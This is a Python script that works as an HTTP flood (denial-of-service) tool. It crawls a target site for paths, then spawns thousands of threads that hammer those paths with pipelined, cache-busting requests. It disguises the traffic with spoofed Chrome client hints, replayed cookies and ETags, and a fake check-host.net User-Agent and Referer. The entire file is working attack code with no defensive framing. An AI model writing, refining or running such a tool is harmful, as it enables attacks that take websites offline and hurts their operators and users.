import threading,socket,ssl,random,string,struct,sys,requests,time
from concurrent.futures import ThreadPoolExecutor,wait
from bs4 import BeautifulSoup
from urllib.parse import urlparse
import h2.connection
import h2.config

def generate_url_path(char_set=string.ascii_letters + string.digits + string.punctuation + "กขฃคฅฆงจฉชซฌญฎฏฐฑฒณดตถทธนบปผฝพฟภมยรลวศษสหฬอฮ๐๑๒๓๔๕๖๗๘๙",num=1):
    return "".join(random.choices(char_set, k=num))

def get_target(url2):
    parsed_url = urlparse(url2.rstrip())
    return {
        'uri': parsed_url.path or '/',
        'host': parsed_url.netloc,
        'scheme': parsed_url.scheme,
        'port': parsed_url.port or ('443' if parsed_url.scheme == 'https' else '80'),
        'normal': url2
    }

def sock_build(target):
 try:
    s = socket.create_connection((target['host'], int(target['port'])))
    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1); s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
    s.setsockopt(socket.IPPROTO_IP, socket.IP_TOS, 0x10)
    if int(target['port']) == 443:s = ssl.SSLContext(ssl.PROTOCOL_TLS,ssl.PROTOCOL_TLS_CLIENT,ssl.PROTOCOL_TLS_SERVER,ssl.PROTOCOL_TLSv1,ssl.PROTOCOL_TLSv1_1,ssl.PROTOCOL_TLSv1_2,ssl.PROTOCOL_SSLv23).wrap_socket(s,server_hostname=target['host'])
    return s
 except:return False

def pkt(packet_raw,options=""):
   user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36'
   import re
   from user_agents import parse
   parsed_ua = parse(user_agent)
   os_version_match = re.search(r"\d+(\.\d+)*", parsed_ua.os.version_string)
   os_version = os_version_match.group(0) if os_version_match else "unknown"
   client_hints = [
        f'Sec-CH-UA: "{parsed_ua.browser.family}";v="{parsed_ua.browser.version_string}"',
        f'Sec-CH-UA-Arch: "x86"' if "Win64" in user_agent or "x86_64" in user_agent else 'Sec-CH-UA-Arch: "arm64"' if "arm" in user_agent.lower() else 'Sec-CH-UA-Arch: "unknown"',
        f'Sec-CH-UA-Bitness: "64"' if "Win64" in user_agent or "x86_64" in user_agent else 'Sec-CH-UA-Bitness: "32"',
        f'Sec-CH-UA-Full-Version: "{parsed_ua.browser.version_string}"',
        f'Sec-CH-UA-Full-Version-List: "{parsed_ua.browser.family}";v="{parsed_ua.browser.version_string}"',
        f'Sec-CH-UA-Mobile: "?1"' if parsed_ua.is_mobile else 'Sec-CH-UA-Mobile: "?0"',
        f'Sec-CH-UA-Model: "{parsed_ua.device.family}"' if parsed_ua.is_mobile else 'Sec-CH-UA-Model: ""',
        f'Sec-CH-UA-Platform: "{parsed_ua.os.family}"',
        f'Sec-CH-UA-Platform-Version: "{os_version}"',
    ]
   return f"{packet_raw[1]} {packet_raw[0]}?time={time.time()} HTTP/1.1\r\nHost: {target['host']}\r\nCache-Control: no-cache, no-store, max-age=0\r\nReferer: {target['normal']}\r\nPragma: no-cache\r\nUpgrade-Insecure-Requests: 1\r\nDnt: 1\r\nPriority: u=0, i\r\nUser-Agent: {user_agent}\r\n{'\r\n'.join(client_hints)}\r\nAccept: */*\r\nAccept-Language: *\r\nAccept-Encoding: *\r\nTe: trailers\r\nSec-Fetch-Dest: document\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-Site: same-origin\r\nSec-Fetch-User: ?1{options}\r\n\r\n".encode()

import re

def reply_recheck(data):
    try:
        head_server_reply = data.split(b'\r\n\r\n', 1)[0].decode()
        headers = {
            "ETag": re.search(r"(?m)^ETag:\s*(.+)", head_server_reply),
            "Last-Modified": re.search(r"(?m)^Last-Modified:\s*(.+)", head_server_reply),
        }
        If_None_Match = headers["ETag"].group(1) if headers["ETag"] else None
        If_Modified_Since = headers["Last-Modified"].group(1) if headers["Last-Modified"] else None
        cookies = {m[0]: m[1] for m in re.findall(r"(?m)^Set-Cookie:\s*([^=]+)=([^;]+)", head_server_reply)}
        cookie_header = "; ".join(f"{k}={v}" for k, v in cookies.items())
        headers_more = [
            f"Cookie: {cookie_header}" if cookie_header else "",
            f"If-Modified-Since: {If_Modified_Since}" if If_Modified_Since else "",
            f"If-None-Match: {If_None_Match}" if If_None_Match else "",
        ]
        headers_more = "\r\n".join(filter(None, headers_more))
        return f"\r\n{headers_more}" if headers_more else ""
    except:
        return ""

def recv_packet(s):
    import selectors
    """ Read data quickly using event-driven approach """
    sel = selectors.DefaultSelector()
    sel.register(s, selectors.EVENT_READ)

    while True:
        events = sel.select(timeout=1)
        for key, mask in events:
            data = key.fileobj.recv(8192)  # Large buffer for faster reads
            if data and data.startswith(b'HTTP/1.1'):
              return reply_recheck(data)
            else:return ""

def Rapid_sender(target,s,packet_raw,paths,meth):
    while True:
        try:
            for _ in range(500):
              s.sendall(pkt(packet_raw)); options = recv_packet(s)
              for path in paths:
                  s.sendall(pkt([path,meth],options))
                  options = recv_packet(s)
              s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 0, 1))
        except:break
        s.shutdown(socket.SHUT_RDWR)
        s.close()
        s = sock_build(target)
          
def Rapid(target,meth,paths):
  try:
    for _ in range(500):
     threading.Thread(target=Rapid_sender,args=(target,sock_build(target),[target['uri'],meth],paths,meth)).start()
  except Exception as e:print(e)

def fast_thread_pool(target,meth,n_threads,path):
    with ThreadPoolExecutor(max_workers=n_threads) as executor:list(executor.submit(Rapid, target,meth,path) for i in range(n_threads))

url,thread,meth = '',0,''

try:
   url, thread, meth = sys.argv[1], int(sys.argv[2]), sys.argv[3]
   target = get_target(url)
except (IndexError, ValueError):print("WELCOME TO TOOL")

blacklist_path = set()

def trace_link(data, links, path, target, protocols, headers):
    thread_append = []
    
    with ThreadPoolExecutor() as executor:
        for tag_set in data:
            for tag in tag_set:
                try:
                    for attr in ('href', 'src'):
                        if attr in tag.attrs:
                            link = tag[attr]
                            if not link:
                                continue
                            parsed_link = urlparse(link)
                            link_get = parsed_link.hostname

                            # Absolute URLs
                            if link.startswith(('https://', 'http://')):
                                if link_get in target and link not in links:
                                    links.append(link)
                                    p = parsed_link.path
                                    if p not in path:
                                        path.append(p)
                                    executor.submit(query_link, link, links, path, target, protocols, headers)
                            
                            # Relative URLs
                            elif target in link or link.startswith("//"):
                                full_link = f'https:{link}' if link.startswith("//") else f'https://{target}{link}'
                                if full_link not in links:
                                    links.append(full_link)
                                if parsed_link.path not in path:
                                    path.append(parsed_link.path)
                                executor.submit(query_link, full_link, links, path, target, protocols, headers)

                            elif not link.startswith('/'):
                                full_link = f'https://{target}/{link}'
                                if full_link not in links:
                                    links.append(full_link)
                                if link not in path:
                                    path.append(link)
                                executor.submit(query_link, full_link, links, path, target, protocols, headers)

                except Exception as e:
                    print(f"Error: {e}")

def query_link(url, links, path, target, protocols, headers):
    global blacklist_path
    try:
        if url.startswith("//"):
            url = f"{protocols}:{url}" if url[2] != ":" else f"{protocols}{url}"
        elif url.startswith('/'):
            url = f"{protocols}://{target}{url}"
        elif 'http' not in url:
            url = f"{protocols}://{target}/{url}"
        if url in blacklist_path:
            return
        blacklist_path.add(url)
        response = requests.get(url, timeout=20, headers=headers)
        soup = BeautifulSoup(response.text, "html.parser")
        trace_link((soup.find_all(href=True), soup.find_all(src=True)), links, path, target, protocols, headers)
    
    except Exception as e:
        print(f"Query failed for {url}: {e}")
header = {
    "User-Agent": "CheckHost (https://check-host.net/)",
    "Accept-Encoding": "gzip, deflate",
    "Referer": f"https://check-host.net/check-report/{generate_url_path(string.ascii_lowercase+string.digits, 12)}",
    "Te": "trailers",
}
paths = []
link_search = []
query_link(url, link_search, paths, target['host'], target['scheme'], header)
paths = [p if p.startswith(('/', 'mailto:')) else '/' + p for p in set(paths)]
if len(paths) == 0:paths.insert(0,target['uri'])
print('\n'.join(paths))
print(len(paths))

for _ in range(thread):
   with ThreadPoolExecutor(max_workers=10) as executor:
        list(executor.submit(fast_thread_pool, target,meth,thread,paths) for i in range(10))